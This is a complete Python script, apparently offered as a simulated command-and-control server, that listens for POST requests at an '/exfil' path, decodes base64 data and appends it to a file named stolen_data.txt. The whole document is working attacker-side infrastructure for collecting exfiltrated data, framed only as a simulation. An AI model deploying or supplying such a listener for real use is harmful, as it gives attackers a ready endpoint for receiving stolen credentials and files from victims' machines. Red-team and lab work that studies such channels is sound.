# Run this script to simulate C2 server

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

class SimpleC2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/exfil':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # Parse the form data (very basic parsing)
            data_part = post_data.decode().split('data=')[1]
            encoded_data = data_part.split('&')[0]
            
            try:
                decoded_data = base64.b64decode(encoded_data).decode()
                
                # Save the data to a file
                with open("stolen_data.txt", "a") as f:
                    f.write(decoded_data + "\n")
                
                print(f"[+] Received and saved data: {decoded_data}")
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Data received.")
            except Exception as e:
                print(f"[-] Error processing data: {e}")
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleC2Handler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Starting C2 listener on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
